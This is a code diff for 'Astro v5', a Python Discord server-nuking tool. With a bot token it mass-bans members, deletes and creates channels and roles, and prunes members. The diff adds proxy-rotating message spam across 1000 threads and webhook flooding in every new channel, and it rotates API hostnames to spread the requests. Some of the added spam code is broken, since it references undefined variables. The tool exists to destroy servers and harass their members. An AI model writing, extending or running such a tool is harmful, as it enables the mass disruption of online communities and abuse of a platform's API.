@@ -1,6 +1,7 @@
 import os
 import sys
 import time
+import json
 import httpx
 import queue
 import random
@@ -18,12 +19,12 @@ class astro:
     if os.name == "nt":
        os.system("cls")
     else:
-       terminal_title = "Astro V4 - Made by horrid"
+       terminal_title = "Astro v5 - Made by horrid"
        print(f'\33]0;{terminal_title}\a', end='', flush=True)
        os.system("clear")
 
     menulogo = f'''
-                                                              - Astro V4 -
+                                                              - Astro v5 -
                                                      ___
                                                   ,o88888
                                                ,o8888888'
@@ -50,7 +51,7 @@ class astro:
                                     [1] - massban ids                         [2] - massban scraped
                                     [3] - delete channels                     [4] - create channels
                                     [5] - delete roles                        [6] - create roles
-                                    [7] - prune members                       [8] - spam server (UNFINISHED)
+                                    [7] - prune members                       [8] - spam server (UNFINISHED) 
 
 > astro.cybin.cc
 > made by horrid
@@ -63,7 +64,7 @@ class astro:
 
 '''
     logo = f'''
-                                                              - Astro V4 -
+                                                              - Astro v5 -
                                                      ___
                                                   ,o88888
                                                ,o8888888'
@@ -98,32 +99,36 @@ class astro:
 
 '''
 
+    with open("settings.json") as f:
+        settings = json.load(f)
+    token = settings.get("Token")
+    channames = settings.get("Channel Names")
+    rolenames = settings.get("Role Names")
+    whookusers = settings.get("Webhook Usernames")
+    whookcontents = settings.get("Spam Messages")
     print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
     print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - loading script...", 1))
     time.sleep(5)
     print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - done, press enter to start.", 1))
     input()
     if os.name == "nt":
-       os.system("title Astro-V4")
+       os.system("title Astro-v5")
        os.system("cls")
     else:
-       terminal_title = "Astro V4 | Made by horrid"
+       terminal_title = "Astro v5 | Made by horrid"
        print(f'\33]0;{terminal_title}\a', end='', flush=True)
        os.system("clear")
     print(Colorate.Vertical(Colors.yellow_to_red, logo, 1))
-    token = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter token: \u001b[0m", 1))
     guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
-    channame = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter channel name: \u001b[0m", 1))
-    channame2 = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter second channel name: \u001b[0m", 1))
-    channames = [channame, channame2]
-    jsonparamrole = {"":""}
-    option = []
-    headers = {"Authorization": f"Bot {token}"}
     q = queue.Queue()
     apiv = ["v9", "v6"]
+    option = []
     count = 0
+    headers = {"Authorization": f"Bot {token}"}
     jsonparam = {"name": random.choice(channames)}
     pruneparam = {"days": 1}
+    jsonparamrole = {"name": random.choice(rolenames)}
+    spamparam = {"content": random.choice(whookcontents)}
 
     def chandelreqsend():
         try:
@@ -263,6 +268,23 @@ class astro:
                 print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
+    def spamreqsend():
+        try:
+            while True:
+                req, url, headers = astro.q.get()
+                p = open("proxies.txt", "r")
+                pr = p.readlines()
+                proxy = {"HTTP": f"http://{random.choice(pr)}"}
+                s = req(url, headers=headers, json=spamparam)
+                astro.count += 1
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} messages sent - status code: {s.status_code} - time: {time.ctime()}", 1))
+                astro.q.task_done()
+        except Exception as err:
+            if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
+            else:
+                print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
+
     def idworker():
         for memberid in open("scraped/ids.txt"):
             ranidapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{memberid}"]
@@ -274,7 +296,7 @@ class astro:
             ranapi = [f"https://discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://discordapp.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://canary.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}", f"https://ptb.discord.com/api/{random.choice(astro.apiv)}/guilds/{astro.guild}/bans/{member}"]
             astro.q.put((httpx.put, random.choice(ranapi), astro.headers))
             amount += 1
-            os.system(f"title AstroV4 - Bans: {amount}")
+            os.system(f"title Astrov5 - Bans: {amount}")
         astro.q.join()
 
     def channeldelworker():
@@ -300,6 +322,11 @@ class astro:
     def pruneworker():
         for i in range(10):
             url = f"https://discord.com/v9/guilds/{astro.guild}/prune/"
+            astro.q.put((httpx.post, url, astro.headers))
+
+    def spamworker():
+        for i in range(1000):
+            ranspamapi = [f"https://discord.com/api/v9/channels/{channel}/messages", f"https://discordapp.com/api/api/v9/channels/{channel}/messages", f"https://canary.discord.com/api/v9/channels/{channel}/messages", f"https://ptb.discord.com/api/v9/channels/{channel}/messages"]
             astro.q.put((httpx.post, url, astro.headers))
 
     @client.event
@@ -414,12 +441,29 @@ class astro:
             for x in range(1):
                 threading.Thread(target=astro.prunereqsend, daemon=True).start()
 
+        if option == "8":
+            if os.name == "nt":
+                os.system("cls")
+            else:
+                os.system("clear")
+            print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
+            time.sleep(5)
+            print(astro.option)
+            astro.spamworker()
+            for x in range(1000):
+                threading.Thread(target=astro.spamreqsend, daemon=True).start()
+
+        else:
+            print("wow retard can't choose a number?, damn.")
+            exit()
+
 @client.event
 async def on_guild_channel_create(channel):
     try:
-       webhook = await channel.create_webhook(name=random.choice(webhookname))
+       webhook = await channel.create_webhook(name=random.choice(astro.whookusers))
        for i in range(100):
-           await webhook.send(random.choice(spammessage))
+           print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - send message to webhook", 1))
+           await webhook.send(random.choice(astro.whookcontents))
     except Exception:
       pass
 
